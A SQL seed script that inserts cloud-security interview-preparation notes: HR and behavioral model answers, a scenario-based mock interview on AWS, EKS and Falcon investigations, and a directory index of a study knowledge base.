-- Batch 1: 10 notes
BEGIN;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Cloud_Security_HR_Interview_Top20$VELSEC$, $VELSEC$Cloud Security Hr Interview Top20$VELSEC$, $VELSEC$Career Development$VELSEC$, ARRAY['Interview_Preparation']::TEXT[], $VELSEC$# Cloud Security Engineer – Top 20 HR / Behavioral Interview Questions & Answers

---

## Q1. Tell me about yourself.

**Answer:**

"I'm a cybersecurity professional with [X years] of experience specializing in cloud security across AWS, Azure, and GCP environments. My background spans cloud security posture management (CSPM), identity and access management, container security, and security operations.

In my current/most recent role, I've been responsible for designing and implementing cloud security controls, managing tools like Prisma Cloud and Wiz for posture management, building automated remediation workflows, and working closely with DevOps teams to embed security into CI/CD pipelines.

What drives me in this field is the constantly evolving challenge — cloud environments change rapidly, and securing them requires both deep technical understanding and the ability to communicate risk effectively to engineering and leadership teams. I'm passionate about building security that enables the business rather than blocking it.

I'm now looking for an opportunity where I can take on greater ownership of cloud security strategy and work with a team that prioritizes proactive security over reactive firefighting."

> **Tip:** Customize the years, tools, and specifics to match your actual resume. Keep it under 90 seconds when spoken.

---

## Q2. Why do you want to work for our company?

**Answer:**

"Three things stand out to me about [Company]:

1. **Cloud-first focus**: Your organization is [heavily invested in cloud / undergoing cloud transformation / running at significant cloud scale], which means the cloud security challenges here are real and complex — exactly the kind of problems I want to solve.

2. **Security culture**: From my research, I can see that [Company] takes security seriously — [cite something specific: your public bug bounty program / your security blog / your investment in a dedicated cloud security team / your compliance certifications]. That tells me security is a first-class priority, not an afterthought.

3. **Growth opportunity**: This role aligns with where I want to grow — [deeper into cloud-native security / into security architecture / into leading a cloud security function]. I believe I can both contribute meaningfully from day one and continue developing here."

> **Tip:** Always research the company beforehand. Reference specific initiatives, tech stack, or values.

---

## Q3. Why are you leaving your current role / Why did you leave your last role?

**Answer:**

"I've had a great experience at [current/previous company] where I built [specific accomplishment — e.g., the cloud security monitoring framework, CSPM deployment, automated compliance workflows]. However, I've reached a point where I want to take on challenges at a larger scale.

Specifically, I'm looking for:
- Exposure to more complex, multi-cloud environments.
- Opportunity to influence cloud security strategy and architecture, not just operate existing tools.
- A team where I can both learn from senior engineers and mentor junior members.

This role checks all those boxes, which is why I'm excited about it."

> **Tip:** Never speak negatively about your current/previous employer. Frame it as growth-oriented.

---

## Q4. What is your greatest strength?

**Answer:**

"My greatest strength is the ability to **bridge the gap between security and engineering teams**. Cloud security is unique because you can't just write policies in isolation — you need to understand how developers build, deploy, and operate services, and then design security controls that fit naturally into their workflows.

For example, at [Company], the DevOps team was resistant to security scanning in the CI/CD pipeline because it added 15 minutes to their build time. Instead of enforcing it as-is, I worked with them to optimize the scanning — implementing incremental scans, caching results, and parallelizing checks — which reduced the overhead to under 3 minutes while maintaining full coverage. The result was 95% adoption within two months versus the 30% we had before.

I bring technical depth combined with the communication skills to get security adopted rather than just mandated."

---

## Q5. What is your greatest weakness?

**Answer:**

"Earlier in my career, I tended to **take on too much myself** rather than delegating or asking for help. When I'd see a misconfigured cloud resource or a security gap, I'd fix it directly rather than escalating or building a process around it. That worked when the environment was small, but it doesn't scale.

I've actively worked on this by:
- Documenting processes and creating runbooks so others can handle recurring issues.
- Training team members on tools like Prisma Cloud and Wiz so I'm not the single point of expertise.
- Prioritizing work that creates lasting, scalable impact (automation, policy-as-code) over one-off fixes.

It's still a conscious effort, but I've gotten much better at building capabilities in the team rather than being the bottleneck."

> **Tip:** Choose a real weakness, show self-awareness, and demonstrate concrete steps you've taken to improve.

---

## Q6. Describe a challenging security incident you handled. (STAR Format)

**Answer:**

**Situation:** A cloud security alert notified us that an IAM access key for a production service account had been committed to a public GitHub repository by a developer.

**Task:** I needed to immediately assess whether the key had been exploited, contain the exposure, and remediate — all while minimizing production impact since the key was actively used by a critical service.

**Action:**
1. **Containment (first 10 min):** Created a new access key for the service account, updated the production service to use the new key, and then deactivated the exposed key — ensuring zero downtime.
2. **Investigation:** Reviewed CloudTrail logs for any API calls made using the exposed key from unauthorized IPs. Found 3 unauthorized API calls within 20 minutes of the commit — the attacker attempted to enumerate S3 buckets and list EC2 instances.
3. **Scope assessment:** Confirmed no data was accessed — the service account had least-privilege permissions scoped only to a specific DynamoDB table.
4. **Remediation:** Rotated all secrets for the affected service, implemented pre-commit hooks with tools like `git-secrets` to prevent future credential leaks, and added repo scanning via GitHub Advanced Security.
5. **Communication:** Briefed engineering leadership and the developer (blameless approach focused on prevention).

**Result:** Contained within 25 minutes. No data breach occurred thanks to least-privilege IAM design. Implemented preventive controls that caught 12 additional credential exposure attempts in the following quarter before they reached any repository.

---

## Q7. How do you handle pressure and tight deadlines?

**Answer:**

"Cloud security often involves high-pressure situations — active incidents, urgent compliance audits, zero-day vulnerabilities requiring immediate patching. I handle this through **structured prioritization**:

1. **Assess impact first**: Not all urgent things are important. I quickly evaluate — is this a real threat or is it audit-driven? What's the blast radius?
2. **Communicate early**: I immediately set expectations with stakeholders about timelines and what information I need from them.
3. **Break it down**: Even under pressure, I break the problem into discrete steps so I can make measurable progress rather than feeling overwhelmed.
4. **Stay calm, stay process-driven**: I follow incident response procedures and playbooks — they exist precisely for high-pressure situations so I don't need to think from scratch.

A specific example: During a Log4Shell (CVE-2021-44228) response, I had to assess exposure across 200+ cloud workloads within hours. I scripted an automated scan, triaged results by internet exposure and data sensitivity, and provided leadership with a prioritized remediation list within 4 hours. Staying methodical under pressure is what made that possible."

---

## Q8. Tell me about a time you disagreed with your manager or team. How did you handle it?

**Answer:**

**Situation:** My manager wanted to implement a blanket policy blocking all public S3 buckets across the organization using an SCP (Service Control Policy). While well-intentioned, I knew several teams legitimately required public buckets for static website hosting and public API documentation.

**Action:**
- I gathered data: identified 8 teams using public buckets with legitimate business justification.
- I prepared an alternative proposal: implement the SCP with **condition-based exceptions** — public buckets are blocked by default, but allowed only in a specific "public-hosting" OU with additional guardrails (encryption, access logging, specific bucket naming convention, CloudFront-only distribution).
- I presented both approaches to my manager with a risk comparison matrix showing that the blanket block would break production services, while the conditional approach achieved the same security goal without disruption.

**Result:** My manager appreciated the data-driven approach and approved the conditional implementation. We achieved 100% enforcement of the security intent while maintaining zero production impact. This became the template for how we implemented all future preventive controls.

> **Key takeaway:** I disagreed respectfully, brought data and an alternative solution, and focused on the shared goal (securing S3) rather than "winning" the argument.

---

## Q9. How do you prioritize when multiple security issues need attention simultaneously?

**Answer:**

"I use a **risk-based prioritization framework**:

| Factor | Weight | Questions I Ask |
|--------|--------|----------------|
| **Exploitability** | High | Is this actively being exploited? Is there a public exploit? |
| **Exposure** | High | Is it internet-facing? Is it in a production environment? |
| **Data sensitivity** | High | What data could be accessed? PII, financial, regulated? |
| **Blast radius** | Medium | How many systems/accounts are affected? |
| **Compensating controls** | Medium | Are there other controls that mitigate the risk temporarily? |
| **Compliance impact** | Medium | Will this cause audit failures or regulatory violations? |

For example, if I have three issues:
- A critical CVE on an internet-facing production server → **P1, immediate**
- An overly permissive IAM role in a dev account → **P2, this week**
- A missing encryption tag on a non-production S3 bucket → **P3, next sprint**

I communicate my prioritization rationale to stakeholders so they understand why their issue isn't being addressed first, and I set clear timelines for each."

---

## Q10. How do you stay current with evolving cloud security threats and technologies?

**Answer:**

"I have a structured approach:

**Daily (15–20 min):**
- Scan security RSS feeds and newsletters (tl;dr sec, CloudSecList, SANS NewsBites).
- Check CISA KEV (Known Exploited Vulnerabilities) catalog for new entries.
- Review cloud provider security bulletins (AWS Security Bulletins, Azure Security Advisories).

**Weekly:**
- Read in-depth write-ups: Rhino Security Labs, Wiz Research, Datadog Security Labs, Sysdig Threat Research.
- Follow cloud security researchers on Twitter/X and LinkedIn.
- Participate in cloud security Slack communities (Cloud Security Forum, AWS Community).

**Monthly:**
- Hands-on lab work: A Cloud Guru, TryHackMe cloud rooms, CloudGoat, Flaws.cloud.
- Attend webinars on new cloud services and their security implications.

**Continuously:**
- Pursuing certifications (e.g., AWS Security Specialty, CCSP, CKS).
- Contributing to internal knowledge base — when I learn something, I document it for the team.

I believe that in cloud security, if you stop learning for 6 months, you're already behind."

---

## Q11. Describe a time when you had to explain a complex security concept to a non-technical audience.

**Answer:**

**Situation:** After a CSPM tool rollout, we identified over 2,000 cloud misconfigurations. Leadership wanted to understand the risk and decide on budget for remediation resources.

**Action:** Instead of presenting raw technical findings, I:

1. **Translated to business risk:** Grouped misconfigurations into categories — "publicly accessible data stores" (5 critical), "over-privileged service accounts" (45 high), "unencrypted data at rest" (120 medium), etc.

2. **Used an analogy:** "Think of our cloud environment as a building. Right now, we have 5 doors wide open to the street (public S3 buckets), 45 master keys left in shared drawers (over-privileged IAM roles), and 120 rooms with unlocked filing cabinets (unencrypted storage). We need to address the open doors today, collect the master keys this week, and lock the cabinets this month."

3. **Quantified impact:** Mapped the top 5 critical misconfigurations to actual breach case studies — "This exact S3 misconfiguration caused the [well-known breach] that cost [company] $X million."

4. **Provided clear asks:** "I need 2 additional engineers for 3 months to remediate the top 200 findings, and $X budget for automated remediation tooling that will prevent recurrence."

**Result:** Leadership approved the budget within a week and cited the presentation as one of the clearest security risk briefings they'd received.

---

## Q12. How do you handle a situation where a developer pushes back on security requirements?

**Answer:**

"This happens frequently in cloud security, and I see it as a collaboration opportunity, not a conflict.

**My approach:**

1. **Listen first**: Understand WHY they're pushing back. Usually it's one of: performance impact, development velocity, complexity, or they simply don't understand the risk.

2. **Empathize**: Acknowledge their constraints. "I understand you have a release deadline and this adds friction."

3. **Educate with context**: Instead of saying 'you must do X,' explain the specific risk. "If we don't encrypt this database, and it's breached, we're looking at regulatory fines of $X and mandatory customer notifications. Here's a real-world example where this happened."

4. **Offer alternatives**: If the initial solution is too heavy, propose a lighter-weight approach that still addresses the risk. "Instead of blocking the deployment, let's add a post-deployment check that auto-remediates within 24 hours."

5. **Escalate with data if needed**: If they still refuse and the risk is unacceptable, I escalate — but I bring options and risk quantification, not ultimatums.

**My philosophy:** Security that developers willingly adopt is more durable than security that's forced. My job is to make the secure path the easy path."

---

## Q13. Where do you see yourself in 3–5 years?

**Answer:**

"In the next 3–5 years, I want to grow into a **senior cloud security architect or cloud security lead** role where I can:

1. **Design security architecture** for complex multi-cloud environments — not just implement controls, but define the security strategy and reference architectures that teams follow.

2. **Lead a team**: Mentor junior cloud security engineers, build out the cloud security function, and create a culture where security is everyone's responsibility.

3. **Drive innovation**: Invest in emerging areas like AI/ML security, runtime cloud workload protection, and security-as-code at scale.

4. **Industry impact**: Contribute to the cloud security community — speak at conferences, publish research, and give back to the open-source security ecosystem.

This role is a strong stepping stone toward that trajectory because it gives me exposure to [reference company's specific cloud security challenges, scale, or technology]."

---

## Q14. Tell me about a time you failed. What did you learn?

**Answer:**

**Situation:** Early in my cloud security journey, I implemented overly restrictive security group rules on a production VPC without fully understanding the application's traffic patterns. This blocked legitimate inter-service communication and caused a 30-minute application outage.

**What happened:** I had identified security groups with "0.0.0.0/0" inbound rules and tightened them based on documented architecture — but the documentation was outdated and didn't reflect several new microservices that had been added.

**What I learned:**

1. **Never trust documentation alone** — always validate by analyzing actual traffic flow data (VPC Flow Logs, network analytics) before making restrictive changes.

2. **Implement changes incrementally** — start with monitoring mode (log violations without blocking) before enforcing.

3. **Have a rollback plan** — I now always script rollback procedures before making any network changes, so recovery is immediate if something breaks.

4. **Communicate change windows** — coordinate with the application team, even for "security-only" changes.

**How I applied it:** I built a standard change process for cloud security hardening that includes a mandatory traffic analysis phase, a monitor-before-enforce phase, and a documented rollback procedure. This process has been adopted by the team and we've had zero outages from security changes since."

---

## Q15. How do you ensure cross-team collaboration in a DevSecOps environment?

**Answer:**

"I follow a **'security as a service'** mindset — I'm there to enable teams, not police them.

**Practically, this means:**

1. **Embed, don't gate**: Integrate security checks into their existing CI/CD pipelines and tools (GitHub Actions, Jenkins, Terraform plan review) rather than requiring a separate security review step.

2. **Speak their language**: When filing a security finding to a DevOps team, I include the specific resource, the CLI/Terraform fix, and the business risk — not just a generic "misconfiguration found."

3. **Office hours and Slack channels**: I hold weekly "cloud security office hours" where developers can bring questions. I also maintain a Slack channel for quick async questions.

4. **Shared responsibility model (internal)**: Clearly define what security owns vs. what dev teams own. Document it. Review it quarterly.

5. **Celebrate wins**: When a team remediates a critical finding quickly or proactively adds security controls, I recognize them publicly. Positive reinforcement drives adoption faster than mandates.

6. **Blameless culture**: When misconfigurations happen, focus on systemic fixes (automation, guardrails, training) rather than blaming individuals."

---

## Q16. What's your approach to learning a new cloud platform or security tool?

**Answer:**

"I follow a structured ramp-up process:

1. **Understand the 'why' first**: Before diving into the tool, understand what problem it solves and where it fits in the security architecture. Read vendor documentation, architecture diagrams, and competitive comparisons.

2. **Hands-on lab (Day 1–3)**: Spin up a trial/sandbox environment and deploy the tool. There's no substitute for clicking through the UI and running the CLI.

3. **Core workflows (Week 1)**: Focus on the 3–5 use cases the tool is primarily designed for. For a CSPM tool, that's: asset discovery, misconfiguration detection, compliance reporting, remediation workflow, and integration with ticketing.

4. **Advanced features (Week 2–3)**: Custom policies, API integration, automation, and query languages (e.g., RQL for Prisma Cloud, Wiz Security Graph queries).

5. **Teach someone else (Week 4)**: The best way to confirm understanding is to present it to a colleague. If I can explain it clearly, I know it well enough.

6. **Build reference materials**: I create internal runbooks and cheat sheets as I learn — this helps the whole team and forces me to organize my knowledge.

I've used this approach to ramp up on Prisma Cloud, Wiz, AWS Security Hub, and several other tools — typically reaching operational proficiency within 3–4 weeks."

---

## Q17. How do you handle a situation where you discover a critical vulnerability but fixing it requires significant downtime?

**Answer:**

"This is a classic risk management decision, and my role is to provide the information needed, not make the business decision unilaterally.

**My approach:**

1. **Quantify the risk**: What's the exploitability? Is it being actively exploited in the wild? What data/systems are at risk? What's the worst-case scenario if it IS exploited?

2. **Quantify the fix cost**: How much downtime? Which services affected? What's the revenue/operational impact of that downtime? Can we schedule it during a maintenance window?

3. **Explore alternatives**: Can we apply a compensating control (WAF rule, network restriction, temporary access revocation) to reduce risk while we schedule a proper fix?

4. **Present options to stakeholders**: Option A — fix now (downtime impact), Option B — apply compensating control now + fix during next maintenance window, Option C — accept risk with documented justification (only if compensating controls make residual risk acceptable).

5. **Document the decision**: Whatever the business decides, I ensure the risk acceptance is documented, time-bounded, and reviewed by an appropriate authority.

**Example:** A critical RCE vulnerability in a production container required rebuilding and redeploying all affected pods. I implemented a WAF virtual patch within 2 hours to block the exploit pattern, then coordinated a rolling deployment during the next maintenance window — zero downtime, zero exposure."

---

## Q18. Describe your experience working in a team. What role do you typically play?

**Answer:**

"I naturally gravitate toward the role of a **technical bridge and knowledge multiplier**.

In team settings, I:
- **Connect the dots**: I'm the person who notices that the infrastructure team's firewall change might affect the compliance team's audit scope, and I proactively bring those groups together.
- **Document and share**: I'm disciplined about creating runbooks, writing up post-incident learnings, and maintaining a knowledge base — because knowledge hoarded is knowledge wasted.
- **Mentor**: I enjoy helping junior team members grow. I do this through pair-investigation sessions (sitting together during alert triage), code reviews on their automation scripts, and pointing them to relevant learning resources.
- **Step up in crises**: During incidents, I'm comfortable taking the investigator role — running the technical investigation while keeping the team lead informed on progress and findings.

I believe the best security teams aren't built on individual heroes — they're built on shared knowledge, clear processes, and mutual trust. I try to be someone who strengthens the team, not just performs within it."

---

## Q19. What salary expectations do you have for this role?

**Answer:**

"I'm looking for compensation that's competitive and reflects the value I bring — specifically my experience in [cloud security architecture, CSPM implementation, multi-cloud security, DevSecOps]. Based on my research of the market for Cloud Security Engineer roles of this scope and seniority, and considering the [location / cost of living / fully remote nature], I'm targeting a range of [₹XX – ₹XX LPA / $XXX,000 – $XXX,000].

That said, compensation is one factor in my decision. I also value:
- The technical challenge and growth potential of the role.
- The team culture and leadership.
- Benefits like learning budgets, certification support, and flexible work arrangements.

I'm open to discussing the full compensation package and finding a number that works for both of us."

> **Tip:** Research market rates on Glassdoor, Levels.fyi, LinkedIn Salary Insights, and Blind before the interview. Always give a range, never a single number.

---

## Q20. Do you have any questions for us?

**Answer _(Ask 3–4 of these)_:**

**About the role:**
- "What does a typical first 90 days look like for someone in this role? What would success look like?"
- "What are the top 2–3 cloud security challenges the team is currently focused on?"
- "How is the cloud security team structured? Who would I be collaborating with most closely?"

**About technology:**
- "Which cloud platforms and security tools does the team primarily use?"
- "How mature is the security-as-code / policy-as-code adoption? Are you using tools like Terraform Sentinel, OPA, or Checkov?"
- "How does the cloud security team interact with the SOC and incident response teams?"

**About culture:**
- "How does the organization support continuous learning — certification budgets, conference attendance, lab environments?"
- "Can you describe the team's on-call expectations?"
- "What's the team's philosophy on security — is it more of a 'shift-left' / enabling model or a 'gatekeeper' model?"

**About growth:**
- "What career progression paths do you see for someone in this role?"
- "Are there opportunities to contribute to security architecture decisions beyond day-to-day operations?"

> **Tip:** Always have questions prepared. Asking nothing signals low interest. Avoid asking about basic logistics (PTO days, etc.) in the first interview — save those for HR/offer stage.

---

## Quick Reference: HR Interview Do's and Don'ts

| ✅ Do | ❌ Don't |
|-------|---------|
| Use STAR format for behavioral answers | Give vague, generic answers |
| Quantify your impact (numbers, percentages, timelines) | Exaggerate or fabricate accomplishments |
| Research the company thoroughly | Say "I don't know much about your company" |
| Show enthusiasm for the role specifically | Sound like you're applying everywhere |
| Be honest about weaknesses with a growth narrative | Say "I have no weaknesses" or give a fake weakness |
| Ask thoughtful questions about role and team | Ask nothing or only about salary/benefits |
| Speak positively about past employers | Badmouth previous managers/colleagues |
| Prepare 3–4 stories that you can adapt to multiple questions | Memorize scripted answers word-for-word |
| Send a brief thank-you email after the interview | Ghost the recruiter |

---$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Cloud_Security_Mock_Interview$VELSEC$, $VELSEC$Cloud Security Mock Interview$VELSEC$, $VELSEC$Career Development$VELSEC$, ARRAY['Interview_Preparation']::TEXT[], $VELSEC$# 🎯 Cloud & Container Security Mock Interview Guide

A highly realistic mock interview simulation designed for a senior/mid-level **Cloud & Container Security Engineer** role at HSBC or a major enterprise.

---

## 🔥 1. Interview Question Bank (Scenario-Based)

### Q: "We noticed an alert from Falcon: 'Privilege Escalation' on an EC2 instance. Walk me through your investigation."
**A:** "First, I would open the Falcon console and look at the process tree to identify the specific binary that triggered the alert and its parent process. I’d check if the binary is known or anomalous. Next, I would pivot to AWS CloudTrail and GuardDuty. Since it's an EC2 instance, I would check if the instance role was assumed recently and if any unexpected API calls (like `sts:AssumeRole`, `iam:CreatePolicyVersion`, or `s3:GetObject`) were made from that instance's metadata IP (`169.254.169.254`). 
If I confirm it's a true positive, my immediate containment step is to attach a Deny-All IAM policy to the instance's role, isolate the EC2 instance using a restrictive Security Group, and capture the disk/memory for IR."

### Q: "GuardDuty flagged an IAM anomaly (e.g., unusual API call). How do you validate if it’s a true positive?"
**A:** "I start by correlating the GuardDuty finding with CloudTrail logs to see exactly what the IAM principal was doing. I check the `userAgent`, `sourceIPAddress`, and the time of the event. Is the API call coming from a known corporate IP or an anomalous location? Did the user agent suddenly change from a standard AWS SDK to a curl command or a different browser? I would also contextualize the principal — is this a CI/CD role that usually assumes this permission, or is it a developer role that shouldn't be making infrastructure changes in production? If the context doesn't match normal behavior, it’s a true positive."

### Q: "An EKS node has a suspicious process running (e.g., a reverse shell). What is your immediate action and investigation strategy?"
**A:** "Immediate action: Use Falcon Real Time Response (RTR) to kill the suspicious process (`sudo docker kill <container-id>` or `kubectl delete pod`). Since the orchestrator might just spin up another pod, the long-term fix is to block the vulnerable image via the Kubernetes Admission Controller (KAC) and quarantine the Node using Network Policies.
For investigation: I’d check the Falcon 'Drift Indicators' to see if the process deviated from the base image. I’ll review the container’s configuration — was it running as root? Did it have host network access? Finally, I’ll coordinate to patch the vulnerability (e.g., arbitrary file upload or RCE) in the image."

---

## 🧠 2. Advanced “What-If” Scenario Questions

### Q: "Your team deployed a new Falcon Prevention Policy to stop container drift. Suddenly, developers report their production application is completely down. What happened and how do you fix it?"
**A:** "What likely happened is the prevention policy was enabled without a proper baseline monitoring phase. The application likely executes legitimate 'drift' as part of its normal operation (e.g., a startup script downloading a config file at runtime, or an auto-updater). 
**Fix:** Immediately switch the policy from 'Prevent' back to 'Alert/Disabled' for that specific host group to restore service. Then, review the blocked processes in Falcon to understand the application’s behavior, build targeted exclusions (by process path, image hash, or namespace), and test the tuning thoroughly in staging before re-enabling prevention."

### Q: "You find an S3 bucket publicly exposed. How do you determine if it's a real risk or a false positive?"
**A:** "Not all public buckets are risks. First, I check the bucket contents and its intended use case. Is it hosting static assets for a public website? If so, it's expected, but I must verify that the bucket policy only allows `s3:GetObject` and strictly denies `s3:PutObject` or `s3:DeleteObject`. Do they have `Block Public Access` disabled at the account level? 
If the bucket contains PII, database backups, or Terraform state files, it's a critical true positive. I would immediately review the specific bucket policy, check CloudTrail data events to see if unauthorized entities have accessed the objects, and apply a restrictive policy."

---

## 🎯 3. 30-60-90 Day Strategy Answer

### Q: "If you join us, what is your plan for the first 30, 60, and 90 days?"
**A:**
* **First 30 Days (Understand & Assess):** Focus on understanding the environment. Review the current AWS architecture, EKS cluster configurations, and the existing Falcon deployment. Identify visibility gaps — do we have 100% sensor coverage? I will build relationships with the DevOps and SOC teams, understand the current alert volume, and review existing Runbooks.
* **Days 31-60 (Optimize & Tune):** Start addressing the highest-noise alerts. I will implement a detection tuning framework to reduce false positives by analyzing the data and creating precise exclusions. I’ll ensure that GuardDuty, CloudTrail, and Falcon alerts are properly correlated in the SIEM. I’ll also review our Kubernetes Admission Controller policies and work to shift them from 'Alert' to 'Prevent' for non-breaking misconfigurations.
* **Days 61-90 (Automate & Prevent):** Shift focus from reactive to proactive. I will implement automated CSPM checks to ensure CIS AWS Foundations compliance. I will establish baseline monitoring for container drift and gradually enable drift prevention policies on critical production clusters. I will also develop automated containment workflows (SOAR) for high-fidelity alerts like IMDSv2 abuse or lateral movement.

---

## 🗣 4. Behavioral + Technical Blended Answers

### Q: "Tell me about a time you had to push back on a developer who wanted to bypass a security control (e.g., running a privileged container)."
**A:** "In a previous project, a DevOps team requested to run a pod as `privileged: true` because their application needed specific host access to manage network interfaces. Instead of just saying 'no', I scheduled a call to understand their technical requirement. I explained the immense risk: a single container breakout would compromise the entire EKS node. 
I worked with them to identify the exact Linux capabilities they needed (like `CAP_NET_ADMIN`) rather than the blanket `privileged` flag. By applying the principle of least privilege through a specific SecurityContext, they got their tool working, and we avoided opening a critical vulnerability."$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$DIRECTORY_INDEX$VELSEC$, $VELSEC$Directory Index$VELSEC$, $VELSEC$Career Development$VELSEC$, ARRAY['Interview_Preparation']::TEXT[], $VELSEC$# 📁 Interview Prep Knowledge Base — Directory Index

> **Last Updated:** 2026-04-08 | **Total Files:** 55+ | **Organized by Domain**

---

## 🗂️ New Organized Structure

```
Interview_Prep/
│
├── 📄 DIRECTORY_INDEX.md                    ← You are here
│
├── 🔴 SOC_Threat_Investigation/             (9 files | ~255 KB)
│   ├── Email_Security_SOC_Guide_Part1.md
│   ├── Email_Security_SOC_Guide_Part2.md
│   ├── Email_Security_SOC_Guide_Part3.md
│   ├── Threat_Hunting_SOC_Guide_Part1.md
│   ├── Threat_Hunting_SOC_Guide_Part2.md
│   ├── Threat_Hunting_SOC_Guide_Part3.md
│   ├── Threat_Hunting_SOC_Guide_Part4.md
│   ├── Reactive_SOC_Investigation_Guide_Part1.md
│   └── Reactive_SOC_Investigation_Guide_Part2.md
│
├── 🟠 Cisco_SOC_Prep/                      (4 files | ~74 KB)
│   ├── Cisco_SOC_Part1_Core_SOC_IR.md
│   ├── Cisco_SOC_Part2_ThreatIntel_MITRE_Hunting.md
│   ├── Cisco_SOC_Part3_Network_Endpoint_Tools.md
│   └── Cisco_SOC_Part4_Scenarios_Behavioral.md
│
├── 🟢 CNAPP_CSPM_Platforms/                 (2 files | ~105 KB)
│   ├── Wiz_CSPM_Interview_QA.md
│   └── Prisma_Cloud_CSPM_Interview_QA.md
│
├── 🟣 AWS_Security_QA/                      (5 files | ~118 KB)
│   ├── Answers_Section1_IAM.md
│   ├── Answers_Section2_Network_Section3_S3.md
│   ├── Answers_Section4_Encryption_Section5_Logging.md
│   ├── Answers_Section6_Compute_Section7_AppSec.md
│   └── Answers_Section8_Compliance_Section9_Grilling.md
│
├── ⚪ WellsFargo_Prep/                      (14 files | ~356 KB)
│   ├── WF_Senior_InfoSec_Mock_Interview_Guide.md
│   ├── WF_Senior_InfoSec_Part4_AppSec.md
│   ├── WF_Senior_InfoSec_Part5_CloudSec.md
│   ├── WF_Senior_InfoSec_Part6_GRC.md
│   ├── WF_Senior_InfoSec_Part7_IRSOC.md
│   ├── WF_Senior_InfoSec_Part8_Architecture.md
│   ├── WF_Interview_PowerBI_SQL_Excel.md
│   ├── WF_Interview_Pitch.md
│   ├── WF_VM_Self_Intro_Pitch.md
│   ├── WF_Gap_Notes_Part1_PowerBI_Excel.md
│   ├── WF_Gap_Notes_Part2_ServiceNow_SQL_Splunk.md
│   ├── WF_Gap_Notes_Part3_Azure_GCP_Wiz.md
│   ├── WF_Learning_Resources_Guide.md
│   └── WellsFargo_JD_Coverage_Analysis.md
│
├── ⚪ EY_Prep/                              (2 files | ~41 KB)
│   ├── EY_Cloud_Security_Interview_Prep.md
│   └── EY_CNAPP_Self_Intro.md
│
├── 🟤 General_Interview/                    (5 files | ~166 KB)
│   ├── Ultimate_Interview_Prep_Part1.md
│   ├── Ultimate_Interview_Prep_Part2.md
│   ├── Cloud_Security_HR_Interview_Top20.md
│   ├── Cloud_Security_Mock_Interview.md
│   └── Self_Intro.md
│
└── 🟤 Resume/                               (1 file | ~10 KB)
    └── GopiKrishna_Resume_HSBC_CloudSecurity.md
```

---

## Also in the Parent CNAPP/ Directory:

```
CNAPP/
├── 🟡 Cloud_Security_Guides/               (12 files | ~519 KB + 7MB PDF)
│   ├── Advanced_Cloud_Security_Study_Guide.md
│   ├── Cloud_Security_Study_Guide.md
│   ├── Cloud_Security_Complete_Playbook.md
│   ├── Cloud_Security_Unified_Mastery_Guide.md   (205 KB — largest)
│   ├── Cloud_Security_Automation_Scripts.md
│   ├── cloud_security_interview_guide.md
│   ├── cloud_security_interview_guide.docx
│   ├── AWS_Security.pdf                          (7 MB)
│   ├── Financial_Compliance_Frameworks.md
│   ├── CNAPP_Structured_Guide.md
│   ├── CNAPP_Policy_Examples.md
│   └── KAC_and_Runtime_Detections_Guide.md
│
├── 🔵 Container_K8s_Security/              (4 files | ~142 KB)
│   ├── EKS_K8s_Security_CNAPP.md
│   ├── ECS_Container_Security_CNAPP.md
│   ├── K8s_Security_Manifests_Examples.md
│   └── container_mitre_scenarios.docx
│
├── Advanced_Cloud_Security_Study_Guide.md
├── INDEX.md
├── build_gitbook.py / index.html / pages_data.*
│
└── Interview_Prep/                          ← Organized above
```

---

## 📊 Category Summary

| Color | Folder | Domain | Files | Purpose |
|-------|--------|--------|-------|---------|
| 🔴 | `SOC_Threat_Investigation/` | SOC Ops, Threat Hunting, IR | 9 | Operational guides & playbooks |
| 🟠 | `Cisco_SOC_Prep/` | Cisco MSS SOC Role | 4 | Role-specific interview prep |
| 🟢 | `CNAPP_CSPM_Platforms/` | Wiz, Prisma Cloud | 2 | Platform-specific Q&A banks |
| 🟣 | `AWS_Security_QA/` | AWS Security Services | 5 | Service-by-service Q&A |
| ⚪ | `WellsFargo_Prep/` | Wells Fargo InfoSec | 14 | Company-specific prep |
| ⚪ | `EY_Prep/` | EY Cloud Security | 2 | Company-specific prep |
| 🟤 | `General_Interview/` | Cross-Company Prep | 5 | HR, behavioral, general Q&A |
| 🟤 | `Resume/` | Resume | 1 | Resume documents |
| 🟡 | `Cloud_Security_Guides/` | Cloud Security KB | 12 | Study guides (parent dir) |
| 🔵 | `Container_K8s_Security/` | Container Security | 4 | K8s/ECS/EKS guides (parent dir) |

---

## 🔗 Reading Paths by Career Goal

### 🎯 SOC Analyst / Threat Hunter / IR Role
```
Reading Order:
1. SOC_Threat_Investigation/Email_Security_SOC_Guide_Part1-3
2. SOC_Threat_Investigation/Threat_Hunting_SOC_Guide_Part1-4
3. SOC_Threat_Investigation/Reactive_SOC_Investigation_Guide_Part1-2
4. Cisco_SOC_Prep/Parts 1-4
5. General_Interview/ (HR prep)
```

### ☁️ Cloud Security / CNAPP Engineer Role
```
Reading Order:
1. Cloud_Security_Guides/Cloud_Security_Unified_Mastery_Guide
2. Cloud_Security_Guides/Advanced_Cloud_Security_Study_Guide
3. CNAPP_CSPM_Platforms/Wiz + Prisma Cloud Q&A
4. AWS_Security_QA/Sections 1-9
5. Container_K8s_Security/ guides
6. General_Interview/ (HR prep)
```

### 🏦 Company-Specific Interview
```
Reading Order:
1. General_Interview/Self_Intro.md (customize)
2. General_Interview/Ultimate_Interview_Prep_Part1-2
3. General_Interview/Cloud_Security_HR_Interview_Top20
4. [Company Folder] — WellsFargo_Prep/ or EY_Prep/ or Cisco_SOC_Prep/
5. Resume/ — Review and tailor
```$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
